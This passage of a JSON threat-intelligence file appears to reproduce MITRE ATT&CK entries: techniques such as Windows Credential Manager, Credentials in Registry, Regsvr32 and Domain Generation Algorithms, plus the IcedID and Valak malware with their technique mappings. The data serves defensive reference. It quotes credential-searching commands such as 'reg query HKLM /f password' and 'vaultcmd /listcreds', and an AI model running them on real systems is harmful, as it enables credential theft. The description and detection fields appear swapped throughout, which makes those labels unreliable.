                "detection": "Adversaries may attempt to find group and permission settings. This information can help adversaries determine which user accounts and groups are available, the membership of users in particular groups, and which users and groups have elevated permissions.",
                "is_subtype": false,
                "platforms": [
                    "Windows",
                    "Azure AD",
                    "Office 365",
                    "SaaS",
                    "IaaS",
                    "Linux",
                    "macOS",
                    "Google Workspace"
                ]
            }
        },
        {
            "id": "S0483",
            "type": "tool",
            "attributes": {
                "name": "IcedID",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "IcedID is a modular banking malware designed to steal financial information that has been observed in the wild since at least 2017.  IcedID  has been downloaded by Emotet in multiple campaigns.",
                "platforms": [
                    "Windows"
                ]
            },
            "val": 19,
            "techniques": [
                "T1218.007",
                "T1047",
                "T1547.001",
                "T1059.005",
                "T1566.001",
                "T1185",
                "T1573.002",
                "T1027.002",
                "T1053.005",
                "T1106",
                "T1204.002",
                "T1087.002",
                "T1071.001",
                "T1105",
                "T1069",
                "T1027",
                "T1055.004",
                "T1027.003",
                "T1082"
            ]
        },
        {
            "id": "T1555.004",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Windows Credential Manager",
                "chain_phase": "credential-access",
                "description": "Monitor process and command-line parameters of <code>vaultcmd.exe</code> for suspicious activity, such as listing credentials from the Windows Credentials locker (i.e., <code>vaultcmd /listcreds:“Windows Credentials”</code>).(Citation: Malwarebytes The Windows Vault)\n\nConsider monitoring API calls such as <code>CredEnumerateA</code> that may list credentials from the Windows Credential Manager.(Citation: Microsoft CredEnumerate)(Citation: Delpy Mimikatz Crendential Manager)\n\nConsider monitoring file reads to Vault locations, <code>%Systemdrive%\\Users\\\\[Username]\\AppData\\Local\\Microsoft\\\\[Vault/Credentials]\\</code>, for suspicious activity.(Citation: Malwarebytes The Windows Vault)",
                "detection": "Adversaries may acquire credentials from the Windows Credential Manager. The Credential Manager stores credentials for signing into websites, applications, and/or devices that request authentication through NTLM or Kerberos in Credential Lockers (previously known as Windows Vaults).\n\nThe Windows Credential Manager separates website credentials from application or network credentials in two lockers. As part of Credentials from Web Browsers, Internet Explorer and Microsoft Edge website credentials are managed by the Credential Manager and are stored in the Web Credentials locker. Application and network credentials are stored in the Windows Credentials locker.\n\nCredential Lockers store credentials in encrypted <code>.vcrd</code> files, located under <code>%Systemdrive%\\Users\\\\Username\\AppData\\Local\\Microsoft\\\\Vault/Credentials\\</code>. The encryption key can be found in a file named <code>Policy.vpol</code>, typically located in the same folder as the credentials.\n\nAdversaries may list credentials managed by the Windows Credential Manager through several mechanisms. <code>vaultcmd.exe</code> is a native Windows executable that can be used to enumerate credentials stored in the Credential Locker through a command-line interface. Adversaries may gather credentials by reading files located inside of the Credential Lockers. Adversaries may also abuse Windows APIs such as <code>CredEnumerateA</code> to list credentials managed by the Credential Manager.\n\nAdversaries may use password recovery tools to obtain plain text passwords from the Credential Manager.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1132.001",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Standard Encoding",
                "chain_phase": "command-and-control",
                "description": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)",
                "detection": "Adversaries may encode data with a standard data encoding system to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system that adheres to existing protocol specifications. Common data encoding schemes include ASCII, Unicode, hexadecimal, Base64, and MIME.  Some data encoding systems may also result in data compression, such as gzip.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1564.004",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "NTFS File Attributes",
                "chain_phase": "defense-evasion",
                "description": "Forensic techniques exist to identify information stored in NTFS EA. (Citation: Journey into IR ZeroAccess NTFS EA) Monitor calls to the <code>ZwSetEaFile</code> and <code>ZwQueryEaFile</code> Windows API functions as well as binaries used to interact with EA, (Citation: Oddvar Moe ADS1 Jan 2018) (Citation: Oddvar Moe ADS2 Apr 2018) and consider regularly scanning for the presence of modified information. (Citation: SpectorOps Host-Based Jul 2017)\n\nThere are many ways to create and interact with ADSs using Windows utilities. Monitor for operations (execution, copies, etc.) with file names that contain colons. This syntax (ex: <code>file.ext:ads[.ext]</code>) is commonly associated with ADSs. (Citation: Microsoft ADS Mar 2014) (Citation: Oddvar Moe ADS1 Jan 2018) (Citation: Oddvar Moe ADS2 Apr 2018) For a more exhaustive list of utilities that can be used to execute and create ADSs, see https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f.\n\nThe Streams tool of Sysinternals can be used to uncover files with ADSs. The <code>dir /r</code> command can also be used to display ADSs. (Citation: Symantec ADS May 2009) Many PowerShell commands (such as Get-Item, Set-Item, Remove-Item, and Get-ChildItem) can also accept a <code>-stream</code> parameter to interact with ADSs. (Citation: MalwareBytes ADS July 2015) (Citation: Microsoft ADS Mar 2014)",
                "detection": "Adversaries may use NTFS file attributes to hide their malicious data in order to evade detection. Every New Technology File System (NTFS) formatted partition contains a Master File Table (MFT) that maintains a record for every file/directory on the partition.  Within MFT entries are file attributes,  such as Extended Attributes (EA) and Data known as Alternate Data Streams (ADSs) when more than one Data attribute is present, that can be used to store arbitrary data (and even complete files).    \n\nAdversaries may store malicious data or binaries in file attribute metadata instead of directly in files. This may be done to evade some defenses, such as static indicator scanning tools and anti-virus.  ",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1566.002",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Spearphishing Link",
                "chain_phase": "initial-access",
                "description": "URL inspection within email (including expanding shortened links) can help detect links leading to known malicious sites. Detonation chambers can be used to detect these links and either automatically go to these sites to determine if they're potentially malicious, or wait and capture the content if a user visits the link.\n\nFiltering based on DKIM+SPF or header analysis can help detect when the email sender is spoofed.(Citation: Microsoft Anti Spoofing)(Citation: ACSC Email Spoofing)\n\nBecause this technique usually involves user interaction on the endpoint, many of the possible detections take place once [User Execution](https://attack.mitre.org/techniques/T1204) occurs.",
                "detection": "Adversaries may send spearphishing emails with a malicious link in an attempt to gain access to victim systems. Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.\n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging User Execution. The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place. Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly or verify the receipt of an email (i.e. web bugs/web beacons). Links may also direct users to malicious applications  designed to Steal Application Access Tokens, like OAuth tokens, in order to gain access to protected applications and information.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows",
                    "Office 365",
                    "SaaS",
                    "Google Workspace"
                ]
            }
        },
        {
            "id": "T1518.001",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Security Software Discovery",
                "chain_phase": "discovery",
                "description": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\n\nIn cloud environments, additionally monitor logs for the usage of APIs that may be used to gather information about security software configurations within the environment.",
                "detection": "Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on a system or in a cloud environment. This may include things such as firewall rules and anti-virus. Adversaries may use the information from Security Software Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nExample commands that can be used to obtain security software information are netsh, <code>reg query</code> with Reg, <code>dir</code> with cmd, and Tasklist, but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for. It is becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.\n\nAdversaries may also utilize cloud APIs to discover the configurations of firewall rules within an environment.",
                "is_subtype": true,
                "platforms": [
                    "Windows",
                    "Azure AD",
                    "Office 365",
                    "SaaS",
                    "IaaS",
                    "Linux",
                    "macOS",
                    "Google Workspace"
                ]
            }
        },
        {
            "id": "T1087.001",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Local Account",
                "chain_phase": "discovery",
                "description": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\n\nMonitor for processes that can be used to enumerate user accounts, such as <code>net.exe</code> and <code>net1.exe</code>, especially when executed in quick succession.(Citation: Elastic - Koadiac Detection with EQL)",
                "detection": "Adversaries may attempt to get a listing of local system accounts. This information can help adversaries determine which local accounts exist on a system to aid in follow-on behavior.\n\nCommands such as <code>net user</code> and <code>net localgroup</code> of the Net utility and <code>id</code> and <code>groups</code>on macOS and Linux can list local users and groups. On Linux, local users can also be enumerated through the use of the <code>/etc/passwd</code> file.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1114.002",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Remote Email Collection",
                "chain_phase": "collection",
                "description": "Monitor for unusual login activity from unknown or abnormal locations, especially for privileged accounts (ex: Exchange administrator account).",
                "detection": "Adversaries may target an Exchange server, Office 365, or Google Workspace to collect sensitive information. Adversaries may leverage a user's credentials and interact directly with the Exchange server to acquire information from within a network. Adversaries may also access externally facing Exchange services, Office 365, or Google Workspace to access email using credentials or access tokens. Tools such as MailSniper can be used to automate searches for specific keywords.",
                "is_subtype": true,
                "platforms": [
                    "Office 365",
                    "Windows",
                    "Google Workspace"
                ]
            }
        },
        {
            "id": "T1559.002",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Dynamic Data Exchange",
                "chain_phase": "execution",
                "description": "Monitor processes for abnormal behavior indicative of DDE abuse, such as Microsoft Office applications loading DLLs and other modules not typically associated with the application or these applications spawning unusual processes (such as cmd.exe).\n\nOLE and Office Open XML files can be scanned for ‘DDEAUTO', ‘DDE’, and other strings indicative of DDE execution.(Citation: NVisio Labs DDE Detection Oct 2017)",
                "detection": "Adversaries may use Windows Dynamic Data Exchange (DDE) to execute arbitrary commands. DDE is a client-server protocol for one-time and/or continuous inter-process communication (IPC) between applications. Once a link is established, applications can autonomously exchange transactions consisting of strings, warm data links (notifications when a data item changes), hot data links (duplications of changes to a data item), and requests for command execution.\n\nObject Linking and Embedding (OLE), or the ability to link data between documents, was originally implemented through DDE. Despite being superseded by Component Object Model, DDE may be enabled in Windows 10 and most of Microsoft Office 2016 via Registry keys.   \n\nMicrosoft Office documents can be poisoned with DDE commands  , directly or through embedded files , and used to deliver execution via Phishing campaigns or hosted Web content, avoiding the use of Visual Basic for Applications (VBA) macros.  DDE could also be leveraged by an adversary operating on a compromised machine who does not have direct access to a Command and Scripting Interpreter.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1552.002",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Credentials in Registry",
                "chain_phase": "credential-access",
                "description": "Monitor processes for applications that can be used to query the Registry, such as [Reg](https://attack.mitre.org/software/S0075), and collect command parameters that may indicate credentials are being searched. Correlate activity with related suspicious behavior that may indicate an active intrusion to reduce false positives.",
                "detection": "Adversaries may search the Registry on compromised systems for insecurely stored credentials. The Windows Registry stores configuration information that can be used by the system or other programs. Adversaries may query the Registry looking for credentials and passwords that have been stored for use by other programs or services. Sometimes these credentials are used for automatic logons.\n\nExample commands to find Registry keys related to password information: \n\n* Local Machine Hive: <code>reg query HKLM /f password /t REG_SZ /s</code>\n* Current User Hive: <code>reg query HKCU /f password /t REG_SZ /s</code>",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1218.010",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Regsvr32",
                "chain_phase": "defense-evasion",
                "description": "Use process monitoring to monitor the execution and arguments of regsvr32.exe. Compare recent invocations of regsvr32.exe with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity. Command arguments used before and after the regsvr32.exe invocation may also be useful in determining the origin and purpose of the script or DLL being loaded. (Citation: Carbon Black Squiblydoo Apr 2016)",
                "detection": "Adversaries may abuse Regsvr32.exe to proxy execution of malicious code. Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. Regsvr32.exe is also a Microsoft signed binary. \n\nMalicious usage of Regsvr32.exe may avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of allowlists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe can also be used to specifically bypass application control using functionality to load COM scriptlets to execute DLLs under user permissions. Since Regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed.  This variation of the technique is often referred to as a \"Squiblydoo\" attack and has been used in campaigns targeting governments.  \n\nRegsvr32.exe can also be leveraged to register a COM Object used to establish persistence via Component Object Model Hijacking. ",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1119",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Automated Collection",
                "chain_phase": "collection",
                "description": "Depending on the method used, actions could include common file system commands and parameters on the command-line interface within batch files or scripts. A sequence of actions like this may be unusual, depending on the system and network environment. Automated collection may occur along with other techniques such as [Data Staged](https://attack.mitre.org/techniques/T1074). As such, file access monitoring that shows an unusual process performing sequential file opens and potentially copy actions to another location on the file system for many files at once may indicate automated collection behavior. Remote access tools with built-in features may interact directly with the Windows API to gather data. Data may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).",
                "detection": "Once established within a system or network, an adversary may use automated techniques for collecting internal data. Methods for performing this technique could include use of a Command and Scripting Interpreter to search for and copy information fitting set criteria such as file type, location, or name at specific time intervals. This functionality could also be built into remote access tools. \n\nThis technique may incorporate use of other techniques such as File and Directory Discovery and Lateral Tool Transfer to identify and move files.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1104",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Multi-Stage Channels",
                "chain_phase": "command-and-control",
                "description": "Host data that can relate unknown or suspicious process activity using a network connection is important to supplement any existing indicators of compromise based on malware command and control signatures and infrastructure. Relating subsequent actions that may result from Discovery of the system and network information or Lateral Movement to the originating process may also yield useful data.",
                "detection": "Adversaries may create multiple stages for command and control that are employed under different conditions or for certain functions. Use of multiple stages may obfuscate the command and control channel to make detection more difficult.\n\nRemote access tools will call back to the first-stage command and control server for instructions. The first stage may have automated capabilities to collect basic host information, update tools, and upload additional files. A second remote access tool (RAT) could be uploaded at that point to redirect the host to the second-stage command and control server. The second stage will likely be more fully featured and allow the adversary to interact with the system through a reverse shell and additional RAT features.\n\nThe different stages will likely be hosted separately with no overlapping infrastructure. The loader may also have backup first-stage callbacks or Fallback Channels in case the original first-stage communication path is discovered and blocked.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1041",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Exfiltration Over C2 Channel",
                "chain_phase": "exfiltration",
                "description": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)",
                "detection": "Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1008",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Fallback Channels",
                "chain_phase": "command-and-control",
                "description": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)",
                "detection": "Adversaries may use fallback or alternate communication channels if the primary channel is compromised or inaccessible in order to maintain reliable command and control and to avoid data transfer thresholds.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "Windows",
                    "macOS"
                ]
            }
        },
        {
            "id": "S0476",
            "type": "tool",
            "attributes": {
                "name": "Valak",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Valak is a multi-stage modular malware that can function as a standalone information stealer or downloader, first observed in 2019 targeting enterprises in the US and Germany.",
                "platforms": [
                    "Windows"
                ]
            },
            "val": 33,
            "techniques": [
                "T1012",
                "T1033",
                "T1047",
                "T1566.002",
                "T1140",
                "T1113",
                "T1112",
                "T1564.004",
                "T1119",
                "T1041",
                "T1016",
                "T1104",
                "T1566.001",
                "T1114.002",
                "T1518.001",
                "T1132.001",
                "T1559.002",
                "T1552.002",
                "T1027.002",
                "T1053.005",
                "T1059.001",
                "T1204.002",
                "T1087.002",
                "T1071.001",
                "T1057",
                "T1555.004",
                "T1008",
                "T1105",
                "T1087.001",
                "T1027",
                "T1059.007",
                "T1082",
                "T1218.010"
            ]
        },
        {
            "id": "T1090.003",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Multi-hop Proxy",
                "chain_phase": "command-and-control",
                "description": "When observing use of Multi-hop proxies, network data from the actual command and control servers could allow correlating incoming and outgoing flows to trace malicious traffic back to its source. Multi-hop proxies can also be detected by alerting on traffic to known anonymity networks (such as [Tor](https://attack.mitre.org/software/S0183)) or known adversary infrastructure that uses this technique.\n\nIn context of network devices, monitor traffic for encrypted communications from the Internet that is addressed to border routers.  Compare this traffic with the configuration to determine whether it matches with any configured site-to-site Virtual Private Network (VPN) connections the device was intended to have. Monitor traffic for encrypted communications originating from potentially breached routers that is addressed to other routers within the organization.  Compare the source and destination with the configuration of the device to determine if these channels are an authorized Virtual Private Network (VPN) connections or other encrypted modes of communication. Monitor ICMP traffic from the Internet that is addressed to border routers and is encrypted.  Few if any legitimate use cases exist for sending encrypted data to a network device via ICMP.",
                "detection": "To disguise the source of malicious traffic, adversaries may chain together multiple proxies. Typically, a defender will be able to identify the last proxy traffic traversed before it enters their network; the defender may or may not be able to identify any previous proxies before the last-hop proxy. This technique makes identifying the original source of the malicious traffic even more difficult by requiring the defender to trace malicious traffic through several proxies to identify its source. A particular variant of this behavior is to use onion routing networks, such as the publicly available TOR network. \n\nIn the case of network infrastructure, particularly routers, it is possible for an adversary to leverage multiple compromised devices to create a multi-hop proxy chain within the Wide-Area Network (WAN) of the enterprise.  By leveraging Patch System Image, adversaries can add custom code to the affected network devices that will implement onion routing between those nodes.  This custom onion routing network will transport the encrypted C2 traffic through the compromised population, allowing adversaries to communicate with any device within the onion routing network.  This method is dependent upon the Network Boundary Bridging method in order to allow the adversaries to cross the protected network boundary of the Internet perimeter and into the organization’s WAN. Protocols such as ICMP may be used as a transport.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows",
                    "Network"
                ]
            }
        },
        {
            "id": "T1564.003",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Hidden Window",
                "chain_phase": "defense-evasion",
                "description": "Monitor processes and command-line arguments for actions indicative of hidden windows. In Windows, enable and configure event logging and PowerShell logging to check for the hidden window style. In MacOS, plist files are ASCII text files with a specific format, so they're relatively easy to parse. File monitoring can check for the <code>apple.awt.UIElement</code> or any other suspicious plist tag in plist files and flag them.",
                "detection": "Adversaries may use hidden windows to conceal malicious activity from the plain sight of users. In some cases, windows that would typically be displayed when an application carries out an operation can be hidden. This may be utilized by system administrators to avoid disrupting user work environments when carrying out administrative tasks. \n\nOn Windows, there are a variety of features in scripting languages in Windows, such as PowerShell, Jscript, and Visual Basic to make windows hidden. One example of this is <code>powershell.exe -WindowStyle Hidden</code>. \n\nSimilarly, on macOS the configurations for how applications run are listed in property list (plist) files. One of the tags in these files can be <code>apple.awt.UIElement</code>, which allows for Java applications to prevent the application's icon from appearing in the Dock. A common use for this is when applications run in the system tray, but don't also want to show up in the Dock.\n\nAdversaries may abuse these functionalities to hide otherwise visible windows from users so as not to alert the user to adversary activity on the system.",
                "is_subtype": true,
                "platforms": [
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1568.002",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Domain Generation Algorithms",
                "chain_phase": "command-and-control",
                "description": "Detecting dynamically generated domains can be challenging due to the number of different DGA algorithms, constantly evolving malware families, and the increasing complexity of the algorithms. There is a myriad of approaches for detecting a pseudo-randomly generated domain name, including using frequency analysis, Markov chains, entropy, proportion of dictionary words, ratio of vowels to other characters, and more.(Citation: Data Driven Security DGA) CDN domains may trigger these detections due to the format of their domain names. In addition to detecting a DGA domain based on the name, another more general approach for detecting a suspicious domain is to check for recently registered names or for rarely visited domains.\n\nMachine learning approaches to detecting DGA domains have been developed and have seen success in applications. One approach is to use N-Gram methods to determine a randomness score for strings used in the domain name. If the randomness score is high, and the domains are not whitelisted (CDN, etc), then it may be determined if a domain is related to a legitimate host or DGA.(Citation: Pace University Detecting DGA May 2017) Another approach is to use deep learning to classify domains as DGA-generated.(Citation: Elastic Predicting DGA)",
                "detection": "Adversaries may make use of Domain Generation Algorithms (DGAs) to dynamically identify a destination domain for command and control traffic rather than relying on a list of static IP addresses or domains. This has the advantage of making it much harder for defenders block, track, or take over the command and control channel, as there potentially could be thousands of domains that malware can check for instructions.\n\nDGAs can take the form of apparently random or “gibberish” strings (ex: istgmxdejdnxuyla.ru) when they construct domain names by generating each letter. Alternatively, some DGAs employ whole words as the unit by concatenating words together instead of letters (ex: cityjulydish.net). Many DGAs are time-based, generating a different domain for each time period (hourly, daily, monthly, etc). Others incorporate a seed value as well to make predicting future domains more difficult for defenders.\n\nAdversaries may use DGAs for the purpose of Fallback Channels. When contact is lost with the primary command and control server malware may employ a DGA as a means to reestablishing command and control.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1497.003",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Time Based Evasion",
                "chain_phase": "defense-evasion",
                "description": "Time-based evasion will likely occur in the first steps of an operation but may also occur throughout as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained. Detecting actions related to virtualization and sandbox identification may be difficult depending on the adversary's implementation and monitoring required. Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of Discovery, especially in a short period of time, may aid in detection. ",
                "detection": "Adversaries may employ various time-based methods to detect and avoid virtualization and analysis environments. This may include enumerating time-based properties, such as uptime or the system clock, as well as the use of timers or other triggers to avoid a virtual machine environment (VME) or sandbox, specifically those that are automated or only operate for a limited amount of time.\n\nAdversaries may employ various time-based evasions, such as delaying malware functionality upon initial execution using programmatic sleep commands or native system scheduling functionality (ex: Scheduled Task/Job). Delays may also be based on waiting for specific victim conditions to be met (ex: system time, events, etc.) or employ scheduled Multi-Stage Channels to avoid analysis and scrutiny.\n\nAdversaries may also use time as a metric to detect sandboxes and analysis environments, particularly those that attempt to manipulate time mechanisms to simulate longer elapses of time. For example, an adversary may be able to identify a sandbox accelerating time by sampling and calculating the expected value for an environment's timestamp before and after execution of a sleep function.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1559.001",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Component Object Model",
                "chain_phase": "execution",
                "description": "Monitor for COM objects loading DLLs and other modules not typically associated with the application.(Citation: Enigma Outlook DCOM Lateral Movement Nov 2017) Enumeration of COM objects, via [Query Registry](https://attack.mitre.org/techniques/T1012) or [PowerShell](https://attack.mitre.org/techniques/T1059/001), may also proceed malicious use.(Citation: Fireeye Hunting COM June 2019)(Citation: Enigma MMC20 COM Jan 2017)\n\nMonitor for spawning of processes associated with COM objects, especially those invoked by a user different than the one currently logged on. ",
                "detection": "Adversaries may use the Windows Component Object Model (COM) for local code execution. COM is an inter-process communication (IPC) component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces. Through COM, a client object can call methods of server objects, which are typically binary Dynamic Link Libraries (DLL) or executables (EXE).\n\nVarious COM interfaces are exposed that can be abused to invoke arbitrary execution via a variety of programming languages such as C, C++, Java, and Visual Basic. Specific COM objects also exist to directly perform functions beyond code execution, such as creating a Scheduled Task/Job, fileless download/execution, and other adversary behaviors related to privilege escalation and persistence.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1056.004",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Credential API Hooking",
                "chain_phase": "collection",
                "description": "Monitor for calls to the `SetWindowsHookEx` and `SetWinEventHook` functions, which install a hook procedure.(Citation: Microsoft Hook Overview)(Citation: Volatility Detecting Hooks Sept 2012) Also consider analyzing hook chains (which hold pointers to hook procedures for each type of hook) using tools(Citation: Volatility Detecting Hooks Sept 2012)(Citation: PreKageo Winhook Jul 2011)(Citation: Jay GetHooks Sept 2011) or by programmatically examining internal kernel structures.(Citation: Zairon Hooking Dec 2006)(Citation: EyeofRa Detecting Hooking June 2017)\n\nRootkits detectors(Citation: GMER Rootkits) can also be used to monitor for various types of hooking activity.\n\nVerify integrity of live processes by comparing code in memory to that of corresponding static binaries, specifically checking for jumps and other instructions that redirect code flow. Also consider taking snapshots of newly started processes(Citation: Microsoft Process Snapshot) to compare the in-memory IAT to the real addresses of the referenced functions.(Citation: StackExchange Hooks Jul 2012)(Citation: Adlice Software IAT Hooks Oct 2014)",
                "detection": "Adversaries may hook into Windows application programming interface (API) functions to collect user credentials. Malicious hooking mechanisms may capture API calls that include parameters that reveal user authentication credentials. Unlike Keylogging,  this technique focuses specifically on API functions that include parameters that reveal user credentials. Hooking involves redirecting calls to these functions and can be implemented via:\n\n* **Hooks procedures**, which intercept and execute designated code in response to events such as messages, keystrokes, and mouse inputs.\n* **Import address table (IAT) hooking**, which use modifications to a process’s IAT, where pointers to imported API functions are stored.\n* **Inline hooking**, which overwrites the first bytes in an API function to redirect code flow.\n",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1036.005",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "Match Legitimate Name or Location",
                "chain_phase": "defense-evasion",
                "description": "Collect file hashes; file names that do not match their expected hash are suspect. Perform file monitoring; files with known names but in unusual locations are suspect. Likewise, files that are modified outside of an update or patch are suspect.\n\nIf file names are mismatched between the file name on disk and that of the binary's PE metadata, this is a likely indicator that a binary was renamed after it was compiled. Collecting and comparing disk and resource filenames for binaries by looking to see if the InternalName, OriginalFilename, and/or ProductName match what is expected could provide useful leads, but may not always be indicative of malicious activity. (Citation: Elastic Masquerade Ball) Do not focus on the possible names a file could have, but instead on the command-line arguments that are known to be used and are distinct because it will have a better rate of detection.(Citation: Twitter ItsReallyNick Masquerading Update)\n\nIn containerized environments, use image IDs and layer hashes to compare images instead of relying only on their names.(Citation: Docker Images) Monitor for the unexpected creation of new resources within your cluster in Kubernetes, especially those created by atypical users.",
                "detection": "Adversaries may match or approximate the name or location of legitimate files or resources when naming/placing them. This is done for the sake of evading defenses and observation. This may be done by placing an executable in a commonly trusted directory (ex: under System32) or giving it the name of a legitimate, trusted program (ex: svchost.exe). In containerized environments, this may also be done by creating a resource in a namespace that matches the naming convention of a container pod or cluster. Alternatively, a file or container image name given may be a close approximation to legitimate programs/images or something innocuous.\n\nAdversaries may also use the same icon of the file they are trying to mimic.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows",
                    "Containers"
                ]
            }
        },
        {
            "id": "T1070.004",
            "type": "technique",
            "attributes": {
                "val": null,
                "name": "File Deletion",
                "chain_phase": "defense-evasion",
                "description": "It may be uncommon for events related to benign command-line functions such as DEL or third-party utilities or tools to be found in an environment, depending on the user base and how systems are typically used. Monitoring for command-line deletion functions to correlate with binaries or other files that an adversary may drop and remove may lead to detection of malicious activity. Another good practice is monitoring for known deletion and secure deletion tools that are not already on systems within an enterprise network that an adversary could introduce. Some monitoring tools may collect command-line arguments, but may not capture DEL commands since DEL is a native function within cmd.exe.",
                "detection": "Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\n\nThere are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples include native cmd functions such as DEL, secure deletion tools such as Windows Sysinternals SDelete, or other third-party file deletion tools. ",
                "is_subtype": true,
